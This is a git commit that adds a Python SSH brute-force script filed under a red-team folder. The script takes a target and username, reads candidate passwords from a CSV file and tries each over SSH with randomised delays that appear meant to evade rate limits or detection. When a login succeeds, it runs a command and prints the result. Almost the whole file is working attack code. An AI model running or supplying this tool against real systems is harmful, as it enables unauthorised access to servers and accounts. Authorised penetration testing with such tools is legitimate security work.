41b3becc218abe8a2c36594a93f6cb25a3f79f8c
roccosicilia <rocco.sicilia@protonmail.com>
2022-04-01 09:33:34 -0400

    AuthTest

---
+++ RedTeam/BruteForce/AuthTestSSH.py
@@ -0,0 +1,34 @@
+###################################################################################################
+#
+# Test SSH login
+# Author: Rocco <Sheliak> Sicilia
+# Usage: $ 
+# Usage sample: 
+#
+###################################################################################################
+
+import sys
+import paramiko
+import time
+import random
+
+target = sys.argv[1]
+username = sys.argv[2]
+command = "ll"
+
+with open('AuthTestPass.csv','r') as file:
+    content = file.read()
+
+passwords = content.split(",")
+
+for password in passwords:
+    time.sleep(random.uniform(0.5, 10.0))
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(target, "22", username, password)
+        stdin, stdout, stderr = ssh.exec_command(command)
+        lines = stdout.readlines()
+        print(lines)
+    except:
+        print("Auth failure for user {} and password {}".format(username, password))
